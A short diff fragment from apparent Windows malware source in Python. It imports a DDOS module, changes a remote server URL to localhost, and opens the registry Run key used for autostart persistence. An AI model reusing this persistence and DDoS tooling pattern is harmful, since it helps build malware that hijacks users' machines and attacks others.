@@ -12,7 +12,7 @@ import DDOS
 from _zmail import send_mail
 
 exePath = sys.argv[0]
-url = "http://yxzlownserveraddress.yxzl.top:5001/"
+url = "http://localhost:5001/"
 key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                           "Software\Microsoft\Windows\CurrentVersion\Run",
                           0,
